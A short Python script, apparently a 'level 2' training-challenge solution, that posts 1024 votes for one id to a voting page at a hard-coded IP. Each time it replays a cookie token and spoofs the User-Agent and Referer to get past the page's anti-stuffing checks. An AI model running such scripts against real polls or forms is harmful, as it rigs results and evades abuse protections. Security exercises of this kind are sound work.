#!/usr/bin/python3

import requests
import sys

# level 2

url = 'http://158.69.76.135/level2.php'
string_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
referer_string = 'http://158.69.76.135/level2.php'
times = 1024
id = 2500

for i in range(times):

    with requests.Session() as s:
        r = s.get(url, headers={'User-Agent': string_agent})
        c = r.cookies
        key_form = ""
        for cookie in c:
            if cookie.name == 'HoldTheDoor':
                key_form = cookie.value
                break

        l = s.post(url, data={'id': id, 'holdthedoor': 'Enviar', 'key': key_form}, headers={'User-Agent': string_agent, 'referer': referer_string}, cookies = c)
